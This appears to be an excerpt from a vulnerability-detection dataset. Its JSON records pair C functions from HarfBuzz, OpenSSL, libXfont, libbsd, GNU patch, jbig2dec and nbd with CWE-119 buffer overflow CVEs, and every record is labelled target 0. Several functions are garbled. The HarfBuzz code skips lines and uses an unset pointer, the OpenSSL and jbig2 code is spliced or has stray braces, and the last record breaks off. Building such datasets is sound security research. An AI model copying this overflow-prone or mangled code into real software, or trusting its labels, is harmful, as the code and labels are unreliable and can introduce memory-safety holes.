{"idx": 158272, "project": "harfbuzz", "commit_id": "81c8ef785b079980ad5b46be4fe7c7bf156dbf65", "project_url": "https://github.com/behdad/harfbuzz", "commit_url": "https://cgit.freedesktop.org/harfbuzz.old/commit/?id=81c8ef785b079980ad5b46be4fe7c7bf156dbf65", "commit_message": "None", "target": 0, "func": "static HB_Error  Lookup_MarkMarkPos( GPOS_Instance*    gpi,\n\t\t\t\t     HB_GPOS_SubTable* st,\n\t\t\t\t     HB_Buffer        buffer,\n\t\t\t\t     HB_UShort         flags,\n\t\t\t\t     HB_UShort         context_length,\n\t\t\t\t     int               nesting_level )\n{\n  HB_UShort        i, j, mark1_index, mark2_index, property, class;\n  HB_Fixed           x_mark1_value, y_mark1_value,\n\t\t   x_mark2_value, y_mark2_value;\n  HB_Error         error;\n  HB_GPOSHeader*  gpos = gpi->gpos;\n  HB_MarkMarkPos* mmp = &st->markmark;\n\n  HB_MarkArray*    ma1;\n  HB_Mark2Array*   ma2;\n  HB_Mark2Record*  m2r;\n  HB_Anchor*       mark1_anchor;\n  HB_Anchor*       mark2_anchor;\n\n  HB_Position    o;\n\n  HB_UNUSED(nesting_level);\n\n  if ( context_length != 0xFFFF && context_length < 1 )\n    return HB_Err_Not_Covered;\n\n  if ( flags & HB_LOOKUP_FLAG_IGNORE_MARKS )\n    return HB_Err_Not_Covered;\n\n  if ( CHECK_Property( gpos->gdef, IN_CURITEM(),\n\t\t       flags, &property ) )\n    return error;\n\n  error = _HB_OPEN_Coverage_Index( &mmp->Mark1Coverage, IN_CURGLYPH(),\n\t\t\t  &mark1_index );\n  if ( error )\n    return error;\n\n  /* now we search backwards for a suitable mark glyph until a non-mark\n     glyph                                                */\n\n  if ( buffer->in_pos == 0 )\n    return HB_Err_Not_Covered;\n\n  i = 1;\n  j = buffer->in_pos - 1;\n  while ( i <= buffer->in_pos )\n  {\n    error = HB_GDEF_Get_Glyph_Property( gpos->gdef, IN_GLYPH( j ),\n\t\t\t\t\t&property );\n    if ( error )\n      return error;\n\n    if ( !( property == HB_GDEF_MARK || property & HB_LOOKUP_FLAG_IGNORE_SPECIAL_MARKS ) )\n      return HB_Err_Not_Covered;\n\n    if ( flags & HB_LOOKUP_FLAG_IGNORE_SPECIAL_MARKS )\n    {\n      if ( property == (flags & 0xFF00) )\n        break;\n    }\n    else\n      break;\n\n    i++;\n     j--;\n   }\n \n  if ( i > buffer->in_pos )\n    return HB_Err_Not_Covered;\n\n   error = _HB_OPEN_Coverage_Index( &mmp->Mark2Coverage, IN_GLYPH( j ),\n \t\t\t  &mark2_index );\n   if ( error )\n\n  if ( mark1_index >= ma1->MarkCount )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  class        = ma1->MarkRecord[mark1_index].Class;\n  mark1_anchor = &ma1->MarkRecord[mark1_index].MarkAnchor;\n\n  if ( class >= mmp->ClassCount )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  ma2 = &mmp->Mark2Array;\n\n  if ( mark2_index >= ma2->Mark2Count )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  m2r          = &ma2->Mark2Record[mark2_index];\n  mark2_anchor = &m2r->Mark2Anchor[class];\n\n  error = Get_Anchor( gpi, mark1_anchor, IN_CURGLYPH(),\n\t\t      &x_mark1_value, &y_mark1_value );\n  if ( error )\n    return error;\n  error = Get_Anchor( gpi, mark2_anchor, IN_GLYPH( j ),\n\t\t      &x_mark2_value, &y_mark2_value );\n  if ( error )\n    return error;\n\n  /* anchor points are not cumulative */\n\n  o = POSITION( buffer->in_pos );\n\n  o->x_pos     = x_mark2_value - x_mark1_value;\n  o->y_pos     = y_mark2_value - y_mark1_value;\n  o->x_advance = 0;\n  o->y_advance = 0;\n  o->back      = 1;\n\n  (buffer->in_pos)++;\n\n  return HB_Err_Ok;\n}\n", "func_hash": 178106868639481976497145253828664788353, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-3193", "cve_desc": "Heap-based buffer overflow in the Lookup_MarkMarkPos function in the HarfBuzz module (harfbuzz-gpos.c), as used by Qt before 4.7.4 and Pango, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3193"}
{"idx": 158295, "project": "openssl", "commit_id": "1632ef744872edc2aa2a53d487d3e79c965a4ad3", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1632ef744872edc2aa2a53d487d3e79c965a4ad3", "commit_message": "Fix for CVE-2014-0195\n\nA buffer overrun attack can be triggered by sending invalid DTLS fragments\nto an OpenSSL DTLS client or server. This is potentially exploitable to\nrun arbitrary code on a vulnerable client or server.\n\nFixed by adding consistency check for DTLS fragments.\n\nThanks to J\u00fcri Aedla for reporting this issue.", "target": 0, "func": "dtls1_reassemble_fragment(SSL *s, struct hm_header_st* msg_hdr, int *ok)\n\t{\n\thm_fragment *frag = NULL;\n\tpitem *item = NULL;\n\tint i = -1, is_complete;\n\tunsigned char seq64be[8];\n\tunsigned long frag_len = msg_hdr->frag_len, max_len;\n\n\tif ((msg_hdr->frag_off+frag_len) > msg_hdr->msg_len)\n\t\tgoto err;\n\n\t/* Determine maximum allowed message size. Depends on (user set)\n\t * maximum certificate length, but 16k is minimum.\n\t */\n\tif (DTLS1_HM_HEADER_LENGTH + SSL3_RT_MAX_ENCRYPTED_LENGTH < s->max_cert_list)\n\t\tmax_len = s->max_cert_list;\n\telse\n\t\tmax_len = DTLS1_HM_HEADER_LENGTH + SSL3_RT_MAX_ENCRYPTED_LENGTH;\n\n\tif ((msg_hdr->frag_off+frag_len) > max_len)\n\t\tgoto err;\n\n\t/* Try to find item in queue */\n\tmemset(seq64be,0,sizeof(seq64be));\n\tseq64be[6] = (unsigned char) (msg_hdr->seq>>8);\n\tseq64be[7] = (unsigned char) msg_hdr->seq;\n\titem = pqueue_find(s->d1->buffered_messages, seq64be);\n\n\tif (item == NULL)\n\t\t{\n\t\tfrag = dtls1_hm_fragment_new(msg_hdr->msg_len, 1);\n\t\tif ( frag == NULL)\n\t\t\tgoto err;\n\t\tmemcpy(&(frag->msg_header), msg_hdr, sizeof(*msg_hdr));\n\t\tfrag->msg_header.frag_len = frag->msg_header.msg_len;\n                frag->msg_header.frag_off = 0;\n                }\n        else\n               {\n                frag = (hm_fragment*) item->data;\n               if (frag->msg_header.msg_len != msg_hdr->msg_len)\n                       {\n                       item = NULL;\n                       frag = NULL;\n                       goto err;\n                       }\n               }\n\n \n        /* If message is already reassembled, this must be a\n         * retransmit and can be dropped.\n\t\t\t\tfrag_len>sizeof(devnull)?sizeof(devnull):frag_len,0);\n\t\t\tif (i<=0) goto err;\n\t\t\tfrag_len -= i;\n\t\t\t}\n", "func_hash": 74745124692429710262121995963451957444, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-0195", "cve_desc": "The dtls1_reassemble_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly validate fragment lengths in DTLS ClientHello messages, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) via a long non-initial fragment.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0195"}
{"idx": 158311, "project": "libxfont", "commit_id": "4d024ac10f964f6bd372ae0dd14f02772a6e5f63", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=4d024ac10f964f6bd372ae0dd14f02772a6e5f63", "commit_message": "None", "target": 0, "func": "bdfReadCharacters(FontFilePtr file, FontPtr pFont, bdfFileState *pState,\n\t\t  int bit, int byte, int glyph, int scan)\n{\n    unsigned char *line;\n    register CharInfoPtr ci;\n    int         i,\n                ndx,\n                nchars,\n                nignored;\n    unsigned int char_row, char_col;\n    int         numEncodedGlyphs = 0;\n    CharInfoPtr *bdfEncoding[256];\n    BitmapFontPtr  bitmapFont;\n    BitmapExtraPtr bitmapExtra;\n    CARD32     *bitmapsSizes;\n    unsigned char        lineBuf[BDFLINELEN];\n    int         nencoding;\n\n    bitmapFont = (BitmapFontPtr) pFont->fontPrivate;\n    bitmapExtra = (BitmapExtraPtr) bitmapFont->bitmapExtra;\n\n    if (bitmapExtra) {\n\tbitmapsSizes = bitmapExtra->bitmapsSizes;\n\tfor (i = 0; i < GLYPHPADOPTIONS; i++)\n\t    bitmapsSizes[i] = 0;\n    } else\n\tbitmapsSizes = NULL;\n\n    bzero(bdfEncoding, sizeof(bdfEncoding));\n    bitmapFont->metrics = NULL;\n    ndx = 0;\n\n    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n\n    if ((!line) || (sscanf((char *) line, \"CHARS %d\", &nchars) != 1)) {\n\tbdfError(\"bad 'CHARS' in bdf file\\n\");\n\treturn (FALSE);\n    }\n    if (nchars < 1) {\n\tbdfError(\"invalid number of CHARS in BDF file\\n\");\n\treturn (FALSE);\n    }\n    if (nchars > INT32_MAX / sizeof(CharInfoRec)) {\n\tbdfError(\"Couldn't allocate pCI (%d*%d)\\n\", nchars,\n\t\t (int) sizeof(CharInfoRec));\n\tgoto BAILOUT;\n    }\n    ci = calloc(nchars, sizeof(CharInfoRec));\n    if (!ci) {\n\tbdfError(\"Couldn't allocate pCI (%d*%d)\\n\", nchars,\n\t\t (int) sizeof(CharInfoRec));\n\tgoto BAILOUT;\n    }\n    bitmapFont->metrics = ci;\n\n    if (bitmapExtra) {\n\tbitmapExtra->glyphNames = malloc(nchars * sizeof(Atom));\n\tif (!bitmapExtra->glyphNames) {\n\t    bdfError(\"Couldn't allocate glyphNames (%d*%d)\\n\",\n\t\t     nchars, (int) sizeof(Atom));\n\t    goto BAILOUT;\n\t}\n    }\n    if (bitmapExtra) {\n\tbitmapExtra->sWidths = malloc(nchars * sizeof(int));\n\tif (!bitmapExtra->sWidths) {\n\t    bdfError(\"Couldn't allocate sWidth (%d *%d)\\n\",\n\t\t     nchars, (int) sizeof(int));\n\t    return FALSE;\n\t}\n    }\n    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n    pFont->info.firstRow = 256;\n    pFont->info.lastRow = 0;\n    pFont->info.firstCol = 256;\n    pFont->info.lastCol = 0;\n    nignored = 0;\n    for (ndx = 0; (ndx < nchars) && (line) && (bdfIsPrefix(line, \"STARTCHAR\"));) {\n\tint         t;\n\tint         wx;\t\t/* x component of width */\n\tint         wy;\t\t/* y component of width */\n\tint         bw;\t\t/* bounding-box width */\n\tint         bh;\t\t/* bounding-box height */\n\tint         bl;\t\t/* bounding-box left */\n\tint         bb;\t\t/* bounding-box bottom */\n\tint         enc,\n\t            enc2;\t/* encoding */\n\tunsigned char *p;\t/* temp pointer into line */\n \tchar        charName[100];\n \tint         ignore;\n \n\tif (sscanf((char *) line, \"STARTCHAR %99s\", charName) != 1) {\n \t    bdfError(\"bad character name in BDF file\\n\");\n \t    goto BAILOUT;\t/* bottom of function, free and return error */\n \t}\n\tif (bitmapExtra)\n\t    bitmapExtra->glyphNames[ndx] = bdfForceMakeAtom(charName, NULL);\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif (!line || (t = sscanf((char *) line, \"ENCODING %d %d\", &enc, &enc2)) < 1) {\n\t    bdfError(\"bad 'ENCODING' in BDF file\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (enc < -1 || (t == 2 && enc2 < -1)) {\n\t    bdfError(\"bad ENCODING value\");\n\t    goto BAILOUT;\n\t}\n\tif (t == 2 && enc == -1)\n\t    enc = enc2;\n\tignore = 0;\n\tif (enc == -1) {\n\t    if (!bitmapExtra) {\n\t\tnignored++;\n\t\tignore = 1;\n\t    }\n\t} else if (enc > MAXENCODING) {\n\t    bdfError(\"char '%s' has encoding too large (%d)\\n\",\n\t\t     charName, enc);\n\t} else {\n\t    char_row = (enc >> 8) & 0xFF;\n\t    char_col = enc & 0xFF;\n\t    if (char_row < pFont->info.firstRow)\n\t\tpFont->info.firstRow = char_row;\n\t    if (char_row > pFont->info.lastRow)\n\t\tpFont->info.lastRow = char_row;\n\t    if (char_col < pFont->info.firstCol)\n\t\tpFont->info.firstCol = char_col;\n\t    if (char_col > pFont->info.lastCol)\n\t\tpFont->info.lastCol = char_col;\n\t    if (bdfEncoding[char_row] == (CharInfoPtr *) NULL) {\n\t\tbdfEncoding[char_row] = malloc(256 * sizeof(CharInfoPtr));\n\t\tif (!bdfEncoding[char_row]) {\n\t\t    bdfError(\"Couldn't allocate row %d of encoding (%d*%d)\\n\",\n\t\t\t     char_row, INDICES, (int) sizeof(CharInfoPtr));\n\t\t    goto BAILOUT;\n\t\t}\n\t\tfor (i = 0; i < 256; i++)\n\t\t    bdfEncoding[char_row][i] = (CharInfoPtr) NULL;\n\t    }\n\t    if (bdfEncoding[char_row] != NULL) {\n\t\tbdfEncoding[char_row][char_col] = ci;\n\t\tnumEncodedGlyphs++;\n\t    }\n\t}\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"SWIDTH %d %d\", &wx, &wy) != 2)) {\n\t    bdfError(\"bad 'SWIDTH'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (wy != 0) {\n\t    bdfError(\"SWIDTH y value must be zero\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (bitmapExtra)\n\t    bitmapExtra->sWidths[ndx] = wx;\n\n/* 5/31/89 (ef) -- we should be able to ditch the character and recover */\n/*\t\tfrom all of these.\t\t\t\t\t*/\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"DWIDTH %d %d\", &wx, &wy) != 2)) {\n\t    bdfError(\"bad 'DWIDTH'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (wy != 0) {\n\t    bdfError(\"DWIDTH y value must be zero\\n\");\n\t    goto BAILOUT;\n\t}\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"BBX %d %d %d %d\", &bw, &bh, &bl, &bb) != 4)) {\n\t    bdfError(\"bad 'BBX'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif ((bh < 0) || (bw < 0)) {\n\t    bdfError(\"character '%s' has a negative sized bitmap, %dx%d\\n\",\n\t\t     charName, bw, bh);\n\t    goto BAILOUT;\n\t}\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((line) && (bdfIsPrefix(line, \"ATTRIBUTES\"))) {\n\t    for (p = line + strlen(\"ATTRIBUTES \");\n\t\t    (*p == ' ') || (*p == '\\t');\n\t\t    p++)\n\t\t /* empty for loop */ ;\n\t    ci->metrics.attributes = (bdfHexByte(p) << 8) + bdfHexByte(p + 2);\n\t    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n\t} else\n\t    ci->metrics.attributes = 0;\n\n\tif (!line || !bdfIsPrefix(line, \"BITMAP\")) {\n\t    bdfError(\"missing 'BITMAP'\\n\");\n\t    goto BAILOUT;\n\t}\n\t/* collect data for generated properties */\n\tif ((strlen(charName) == 1)) {\n\t    if ((charName[0] >= '0') && (charName[0] <= '9')) {\n\t\tpState->digitWidths += wx;\n\t\tpState->digitCount++;\n\t    } else if (charName[0] == 'x') {\n\t\tpState->exHeight = (bh + bb) <= 0 ? bh : bh + bb;\n\t    }\n\t}\n\tif (!ignore) {\n\t    ci->metrics.leftSideBearing = bl;\n\t    ci->metrics.rightSideBearing = bl + bw;\n\t    ci->metrics.ascent = bh + bb;\n\t    ci->metrics.descent = -bb;\n\t    ci->metrics.characterWidth = wx;\n\t    ci->bits = NULL;\n\t    bdfReadBitmap(ci, file, bit, byte, glyph, scan, bitmapsSizes);\n\t    ci++;\n\t    ndx++;\n\t} else\n\t    bdfSkipBitmap(file, bh);\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\t/* get STARTCHAR or\n\t\t\t\t\t\t\t * ENDFONT */\n    }\n\n    if (ndx + nignored != nchars) {\n\tbdfError(\"%d too few characters\\n\", nchars - (ndx + nignored));\n\tgoto BAILOUT;\n    }\n    nchars = ndx;\n    bitmapFont->num_chars = nchars;\n    if ((line) && (bdfIsPrefix(line, \"STARTCHAR\"))) {\n\tbdfError(\"more characters than specified\\n\");\n\tgoto BAILOUT;\n    }\n    if ((!line) || (!bdfIsPrefix(line, \"ENDFONT\"))) {\n\tbdfError(\"missing 'ENDFONT'\\n\");\n\tgoto BAILOUT;\n    }\n    if (numEncodedGlyphs == 0)\n\tbdfWarning(\"No characters with valid encodings\\n\");\n\n    nencoding = (pFont->info.lastRow - pFont->info.firstRow + 1) *\n\t(pFont->info.lastCol - pFont->info.firstCol + 1);\n    bitmapFont->encoding = calloc(NUM_SEGMENTS(nencoding),sizeof(CharInfoPtr*));\n    if (!bitmapFont->encoding) {\n\tbdfError(\"Couldn't allocate ppCI (%d,%d)\\n\",\n                 NUM_SEGMENTS(nencoding),\n                 (int) sizeof(CharInfoPtr*));\n\tgoto BAILOUT;\n    }\n    pFont->info.allExist = TRUE;\n    i = 0;\n    for (char_row = pFont->info.firstRow;\n\t    char_row <= pFont->info.lastRow;\n\t    char_row++) {\n\tif (bdfEncoding[char_row] == (CharInfoPtr *) NULL) {\n\t    pFont->info.allExist = FALSE;\n            i += pFont->info.lastCol - pFont->info.firstCol + 1;\n\t} else {\n\t    for (char_col = pFont->info.firstCol;\n\t\t    char_col <= pFont->info.lastCol;\n\t\t    char_col++) {\n\t\tif (!bdfEncoding[char_row][char_col])\n\t\t    pFont->info.allExist = FALSE;\n                else {\n                    if (!bitmapFont->encoding[SEGMENT_MAJOR(i)]) {\n                        bitmapFont->encoding[SEGMENT_MAJOR(i)]=\n                            calloc(BITMAP_FONT_SEGMENT_SIZE,\n                                   sizeof(CharInfoPtr));\n                        if (!bitmapFont->encoding[SEGMENT_MAJOR(i)])\n                            goto BAILOUT;\n                    }\n                    ACCESSENCODINGL(bitmapFont->encoding,i) =\n                        bdfEncoding[char_row][char_col];\n                }\n                i++;\n            }\n\t}\n    }\n    for (i = 0; i < 256; i++)\n\tif (bdfEncoding[i])\n\t    free(bdfEncoding[i]);\n    return (TRUE);\nBAILOUT:\n    for (i = 0; i < 256; i++)\n\tif (bdfEncoding[i])\n\t    free(bdfEncoding[i]);\n    /* bdfFreeFontBits will clean up the rest */\n    return (FALSE);\n}\n", "func_hash": 233543311274131421373611476427752557785, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-6462", "cve_desc": "Stack-based buffer overflow in the bdfReadCharacters function in bitmap/bdfread.c in X.Org libXfont 1.1 through 1.4.6 allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a long string in a character name in a BDF font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6462"}
{"idx": 158324, "project": "libbsd", "commit_id": "c8f0723d2b4520bdd6b9eb7c3e7976de726d7ff7", "project_url": "https://gitlab.freedesktop.org/libbsd/libbsd", "commit_url": "https://cgit.freedesktop.org/libbsd/commit/?id=c8f0723d2b4520bdd6b9eb7c3e7976de726d7ff7", "commit_message": "Fix heap buffer overflow in fgetwln()\n\nIn the function fgetwln() there's a 4 byte heap overflow.\n\nThere is a while loop that has this check to see whether there's still\nenough space in the buffer:\n\n\t\tif (!fb->len || wused > fb->len) {\n\nIf this is true more memory gets allocated. However this test won't be\ntrue if wused == fb->len, but at that point wused already points out\nof the buffer. Some lines later there's a write to the buffer:\n\n\t\tfb->wbuf[wused++] = wc;\n\nThis bug was found with the help of address sanitizer.\n\nWarned-by: ASAN\nFixes: https://bugs.freedesktop.org/show_bug.cgi?id=93881\nSigned-off-by: Guillem Jover <guillem@hadrons.org>", "target": 0, "func": "fgetwln(FILE *stream, size_t *lenp)\n{\n\tstruct filewbuf *fb;\n\twint_t wc;\n\tsize_t wused = 0;\n\n\t/* Try to diminish the possibility of several fgetwln() calls being\n\t * used on different streams, by using a pool of buffers per file. */\n\tfb = &fb_pool[fb_pool_cur];\n\tif (fb->fp != stream && fb->fp != NULL) {\n\t\tfb_pool_cur++;\n\t\tfb_pool_cur %= FILEWBUF_POOL_ITEMS;\n\t\tfb = &fb_pool[fb_pool_cur];\n\t}\n \tfb->fp = stream;\n \n \twhile ((wc = fgetwc(stream)) != WEOF) {\n\t\tif (!fb->len || wused >= fb->len) {\n \t\t\twchar_t *wp;\n \n \t\t\tif (fb->len)\n\t\t\t\tfb->len *= 2;\n\t\t\telse\n\t\t\t\tfb->len = FILEWBUF_INIT_LEN;\n\n\t\t\twp = reallocarray(fb->wbuf, fb->len, sizeof(wchar_t));\n\t\t\tif (wp == NULL) {\n\t\t\t\twused = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tfb->wbuf = wp;\n\t\t}\n\n\t\tfb->wbuf[wused++] = wc;\n\n\t\tif (wc == L'\\n')\n\t\t\tbreak;\n\t}\n\n\t*lenp = wused;\n\treturn wused ? fb->wbuf : NULL;\n}\n", "func_hash": 270452454086101436166140658237240500443, "file_name": "fgetwln.c", "file_hash": 74899023810301719481895724574229840429, "cwe": ["CWE-119"], "cve": "CVE-2016-2090", "cve_desc": "Off-by-one vulnerability in the fgetwln function in libbsd before 0.8.2 allows attackers to have unspecified impact via unknown vectors, which trigger a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2090"}
{"idx": 158371, "project": "libxfont", "commit_id": "5bf703700ee4a5d6eae20da07cb7a29369667aef", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=5bf703700ee4a5d6eae20da07cb7a29369667aef", "commit_message": "None", "target": 0, "func": "CatalogueRescan (FontPathElementPtr fpe)\n{\n    CataloguePtr\tcat = fpe->private;\n    char\t\tlink[MAXFONTFILENAMELEN];\n    char\t\tdest[MAXFONTFILENAMELEN];\n    char\t\t*attrib;\n    FontPathElementPtr\tsubfpe;\n    struct stat\t\tstatbuf;\n    const char\t\t*path;\n    DIR\t\t\t*dir;\n    struct dirent\t*entry;\n    int\t\t\tlen;\n    int\t\t\tpathlen;\n\n    path = fpe->name + strlen(CataloguePrefix);\n    if (stat(path, &statbuf) < 0 || !S_ISDIR(statbuf.st_mode))\n\treturn BadFontPath;\n\n    if (statbuf.st_mtime <= cat->mtime)\n\treturn Successful;\n\n    dir = opendir(path);\n    if (dir == NULL)\n    {\n\txfree(cat);\n\treturn BadFontPath;\n    }\n\n    CatalogueUnrefFPEs (fpe);\n     while (entry = readdir(dir), entry != NULL)\n     {\n \tsnprintf(link, sizeof link, \"%s/%s\", path, entry->d_name);\n\tlen = readlink(link, dest, sizeof dest - 1);\n \tif (len < 0)\n \t    continue;\n\tdest[len] = '\\0';\n\n\tif (dest[0] != '/')\n\t{\n\t   pathlen = strlen(path);\n\t   memmove(dest + pathlen + 1, dest, sizeof dest - pathlen - 1);\n\t   memcpy(dest, path, pathlen);\n\t   memcpy(dest + pathlen, \"/\", 1);\n\t   len += pathlen + 1;\n\t}\n\n\tattrib = strchr(link, ':');\n\tif (attrib && len + strlen(attrib) < sizeof dest)\n\t{\n\t    memcpy(dest + len, attrib, strlen(attrib));\n\t    len += strlen(attrib);\n\t}\n\n\tsubfpe = xalloc(sizeof *subfpe);\n\tif (subfpe == NULL)\n\t    continue;\n\n\t/* The fonts returned by OpenFont will point back to the\n\t * subfpe they come from.  So set the type of the subfpe to\n\t * what the catalogue fpe was assigned, so calls to CloseFont\n\t * (which uses font->fpe->type) goes to CatalogueCloseFont. */\n\tsubfpe->type = fpe->type;\n\tsubfpe->name_length = len;\n\tsubfpe->name = xalloc (len + 1);\n\tif (subfpe == NULL)\n\t{\n\t    xfree(subfpe);\n\t    continue;\n\t}\n\n\tmemcpy(subfpe->name, dest, len);\n\tsubfpe->name[len] = '\\0';\n\n\t/* The X server will manipulate the subfpe ref counts\n\t * associated with the font in OpenFont and CloseFont, so we\n\t * have to make sure it's valid. */\n\tsubfpe->refcount = 1;\n\n\tif (FontFileInitFPE (subfpe) != Successful)\n\t{\n\t    xfree(subfpe->name);\n\t    xfree(subfpe);\n\t    continue;\n\t}\n\n\tif (CatalogueAddFPE(cat, subfpe) != Successful)\n\t{\n\t    FontFileFreeFPE (subfpe);\n\t    xfree(subfpe);\n\t    continue;\n\t}\n    }\n\n    closedir(dir);\n\n    qsort(cat->fpeList,\n\t  cat->fpeCount, sizeof cat->fpeList[0], ComparePriority);\n\n    cat->mtime = statbuf.st_mtime;\n\n    return Successful;\n}\n", "func_hash": 228542085319408063625872411309938296359, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2007-5199", "cve_desc": "A single byte overflow in catalogue.c in X.Org libXfont 1.3.1 allows remote attackers to have unspecified impact.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2007-5199"}
{"idx": 158394, "project": "savannah", "commit_id": "a0d7fe4589651c64bd16ddaaa634030bb0455866", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/patch.git/commit/src/pch.c?id=a0d7fe4589651c64bd16ddaaa634030bb0455866", "commit_message": "None", "target": 0, "func": " pch_write_line (lin line, FILE *file)\n {\n  bool after_newline = (p_len[line] > 0) && (p_line[line][p_len[line] - 1] == '\\n');\n   if (! fwrite (p_line[line], sizeof (*p_line[line]), p_len[line], file))\n     write_fatal ();\n   return after_newline;\n}\n", "func_hash": 217144092183050078310306191340626200681, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-10713", "cve_desc": "An issue was discovered in GNU patch before 2.7.6. Out-of-bounds access within pch_write_line() in pch.c can possibly lead to DoS via a crafted input file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10713"}
{"idx": 158399, "project": "ghostscript", "commit_id": "e698d5c11d27212aa1098bc5b1673a3378563092", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=jbig2dec.git;a=commit;h=e698d5c11d27212aa1098bc5b1673a3378563092", "commit_message": "None", "target": 0, "func": "jbig2_decode_gray_scale_image(Jbig2Ctx *ctx, Jbig2Segment *segment,\n                              const byte *data, const size_t size,\n                              bool GSMMR, uint32_t GSW, uint32_t GSH,\n                              uint32_t GSBPP, bool GSUSESKIP, Jbig2Image *GSKIP, int GSTEMPLATE, Jbig2ArithCx *GB_stats)\n {\n     uint8_t **GSVALS = NULL;\n     size_t consumed_bytes = 0;\n    uint32_t i, j, stride, x, y;\n    int code;\n     Jbig2Image **GSPLANES;\n     Jbig2GenericRegionParams rparams;\n     Jbig2WordStream *ws = NULL;\n    Jbig2ArithState *as = NULL;\n\n    /* allocate GSPLANES */\n    GSPLANES = jbig2_new(ctx, Jbig2Image *, GSBPP);\n    if (GSPLANES == NULL) {\n        jbig2_error(ctx, JBIG2_SEVERITY_FATAL, segment->number, \"failed to allocate %d bytes for GSPLANES\", GSBPP);\n        return NULL;\n    }\n\n    for (i = 0; i < GSBPP; ++i) {\n        GSPLANES[i] = jbig2_image_new(ctx, GSW, GSH);\n         if (GSPLANES[i] == NULL) {\n             jbig2_error(ctx, JBIG2_SEVERITY_FATAL, segment->number, \"failed to allocate %dx%d image for GSPLANES\", GSW, GSH);\n             /* free already allocated */\n            for (j = i; j > 0;)\n                jbig2_image_release(ctx, GSPLANES[--j]);\n             jbig2_free(ctx->allocator, GSPLANES);\n             return NULL;\n         }\n        }\n    }\n", "func_hash": 264680539555902462578789547952215319677, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-9601", "cve_desc": "ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9601"}
{"idx": 158429, "project": "nbd", "commit_id": "3ef52043861ab16352d49af89e048ba6339d6df8", "project_url": "https://github.com/yoe/nbd", "commit_url": "https://github.com/yoe/nbd/commit/3ef52043861ab16352d49af89e048ba6339d6df8", "commit_message": "Fix buffer size checking\n\nYes, this means we've re-introduced CVE-2005-3534. Sigh.", "target": 0, "func": "int mainloop(CLIENT *client) {\n\tstruct nbd_request request;\n\tstruct nbd_reply reply;\n\tgboolean go_on=TRUE;\n#ifdef DODBG\n\tint i = 0;\n#endif\n\tnegotiate(client->net, client, NULL);\n\tDEBUG(\"Entering request loop!\\n\");\n\treply.magic = htonl(NBD_REPLY_MAGIC);\n\treply.error = 0;\n\twhile (go_on) {\n\t\tchar buf[BUFSIZE];\n\t\tsize_t len;\n#ifdef DODBG\n\t\ti++;\n\t\tprintf(\"%d: \", i);\n#endif\n\t\treadit(client->net, &request, sizeof(request));\n\t\trequest.from = ntohll(request.from);\n\t\trequest.type = ntohl(request.type);\n\n\t\tif (request.type==NBD_CMD_DISC) {\n\t\t\tmsg2(LOG_INFO, \"Disconnect request received.\");\n                \tif (client->server->flags & F_COPYONWRITE) { \n\t\t\t\tif (client->difmap) g_free(client->difmap) ;\n                \t\tclose(client->difffile);\n\t\t\t\tunlink(client->difffilename);\n\t\t\t\tfree(client->difffilename);\n\t\t\t}\n\t\t\tgo_on=FALSE;\n\t\t\tcontinue;\n\t\t}\n\n\t\tlen = ntohl(request.len);\n \n \t\tif (request.magic != htonl(NBD_REQUEST_MAGIC))\n \t\t\terr(\"Not enough 